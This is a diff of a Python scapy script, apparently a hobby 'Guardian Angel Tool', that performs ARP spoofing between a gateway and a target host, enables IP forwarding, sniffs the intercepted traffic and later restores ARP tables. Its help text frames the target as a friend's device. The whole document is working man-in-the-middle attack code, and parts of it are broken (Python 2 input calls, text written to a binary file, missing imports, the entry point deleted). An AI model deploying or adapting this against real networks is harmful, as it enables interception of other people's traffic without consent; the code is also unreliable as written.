@@ -1,38 +1,29 @@
-#! /usr/bin/env python3
-from email import parser
-import scapy.all as scapy
-import sys
-#import os
-import argparse
-from datetime import datetime
-from time import sleep as pause
-import time
-
-
-
-# request = scapy.ARP()
-
-# request.pdst = '137.112.228.214/24'
-# broadcast = scapy.Ether()
-
-# broadcast.dst = 'ff:ff:ff:ff:ff:ff'
-
-# request_broadcast = broadcast / request
-# clients = scapy.srp(request_broadcast, timeout=1)[0]
-# for element in clients:
-#     print(element[1].psrc + "     " + element[1].hwsrc)
+from collections import Counter
+packet_counts = Counter()
+def sniffer(interface):
+    sniff(filter='ip', iface = interface, store = False, prn = process_packet, count = 1)
+    print("\n".join(f"{f'{key[0]} <--> {key[1]}'}: {count}" for key, count in packet_counts.items()))
+def process_packet(packet):
+        # Create tuple of Src/Dst in sorted order
+    key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
+    packet_counts.update([key])
+    return f"Packet #{sum(packet_counts.values())}: {packet[0][1].src} ==> {packet[0][1].dst}"
 
 class PreAttack(object):
     def __init__(self, targ, iface):
         self.target = targ
         self.interface = iface
     def getMacNCheese(self):
-        return scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARO(pdst=self.target),
-        timeout=10, iface=self.interface)[0][0][1][scapy.ARP].hwsrc
+        return srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=self.target),
+        timeout=10, iface=self.interface)[0][0][1][ARP].hwsrc
     class togggleIPForward(object):
         def __init__(self, path='/proc/sys/net/ipv4/ip_forward'):
             self.path = path
         def enableIPForward(self):
+            with open(self.path, 'wb') as file:
+                file.write('1')
+            return 0
+        def disableIPForward(self):
             with open(self.path, 'wb') as file:
                 file.write('0')
             return 0
@@ -42,26 +33,71 @@ class Attack(object):
         self.targ2=targs[1]
         self.iface = iface
     def KuzcosPoison(self, MacNCheese):
-        scapy.send(scapy.ARP(op=2, pdst=self.targ1, psrc=self.targ2, hwdst=MacNCheese[0]), iface=self.iface)
-        scapy.send(scapy.ARP(op=2, pdst=self.targ2, psrc=self.targ1, hwdst=MacNCheese[1]), iface=self.iface)
+        send(ARP(op=2, pdst=self.targ1, psrc=self.targ2, hwdst=MacNCheese[0]), iface=self.iface)
+        send(ARP(op=2, pdst=self.targ2, psrc=self.targ1, hwdst=MacNCheese[1]), iface=self.iface)
     def FixItFelix(self, MacNCheese):
-        scapy.send(scapy.ARP(op=2, pdst=self.targ1, psrc=self.targ2, hwdst='ff:ff:ff:ff:ff:ff',hwsrc=MacNCheese[0]), iface=self.iface)
-        scapy.send(scapy.ARP(op=2, pdst=self.targ2, psrc=self.targ1, hwdst='ff:ff:ff:ff:ff:ff',hwsrc=MacNCheese[1]), iface=self.iface)
+        send(ARP(op=2, pdst=self.targ1, psrc=self.targ2, hwdst='ff:ff:ff:ff:ff:ff',hwsrc=MacNCheese[0]), iface=self.iface)
+        send(ARP(op=2, pdst=self.targ2, psrc=self.targ1, hwdst='ff:ff:ff:ff:ff:ff',hwsrc=MacNCheese[1]), iface=self.iface)
             
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='R.O.S.I.E Guardian Angel Tool')
-    parser.add_argument('-i', '--interface', help='Network interface to attack on', action='store', dest='interface', default=False)
-    parser.add_argument('-t1', '--target1', help='Gateway target', action='store', dest='target1', default=False)
-    parser.add_argument('-t2', '--target2', help='Friend who needs to touch grass IP', action='store', dest='target2', default=False)
-    parser.add_argument('-f', '--forward', help='Auto-toggle IP forwarding', action='store_true', dest='fwd', default=False)
+def Rosie(interface, gWayT, target, fwd):
+    if ((not target) or (not gWayT)):
+        print("Fucking add some arguments damn\n")
+        sys.exit(1)
+    #Setting up attack
+    targets = [gWayT, target]
+    try:
+        MACs = [PreAttack(targets[0], interface).getMacNCheese(), PreAttack(targets[1], interface).getMacNCheese()] 
+        print('[POGGED]')
+    except Exception:
+        print('[FUCK]\n no address(es)')
+        sys.exit(1);
+    try:
+        if fwd:
+            PreAttack.togggleIPForward().enableIPForward()
+            print("[POGGED]")
+    except IOError:
+        print('[FUCK]')
+        try:
+            choice = raw_input('Proceed? [y/N]').strip().lower()[0]
+            if choice == 'y':
+                pass
+            elif choice == 'n':
+                print('Shutting down')
+                sys.exit(1)
+            else:
+                print('There were two options, buddy')
+                sys.exit(1)
+        except KeyboardInterrupt:
+            sys.exit(1)
+    # Attack is setup now
+    try:
+        try:
+            Attack(targets, interface).KuzcosPoison(MACs)
+            sniff(prn=lambda x:x.summary())
+            #sniff(prn=lambda x:x.summary(), count=1)
+        except Exception:
+            print('Failed to poison')
+            sys.exit(1)
+        print('poison sent to %s and %s' %(targets[0], targets[1]))
+        pause(2.5)
+    except KeyboardInterrupt:
+        #fix the ARP tables
+        for i in range(0,16):
+            try:
+                Attack(targets, interface).FixItFelix(MACs)
+                #sniff(prn=lambda x:x.summary(), count=1)
+            except(Exception, KeyboardInterrupt):
+                print('[FUCK]')
+                sys.exit(1)
+            pause(2)
+        print('[POGGED]')
+        try:
+            if fwd:
+                print('Disable IP forwarding')
+                sys.stdout.flush()
+                PreAttack.togggleIPForward().disableIPForward()
+                print('[POGGED]')
+        except IOError:
+            print('[FUCK]')
     
-    args = parser.parse_args()
-    if len(sys.argv)==1:
-        parser.print_help()
-        sys.exit(1)
-    elif ((not args.target1) or (not args.target2)):
-        parser.error("Invalid Targets")
-        sys.exit(1)
-    elif not args.interface:
-        parser.error("No network interface given")
-        sys.exit(1)
+        
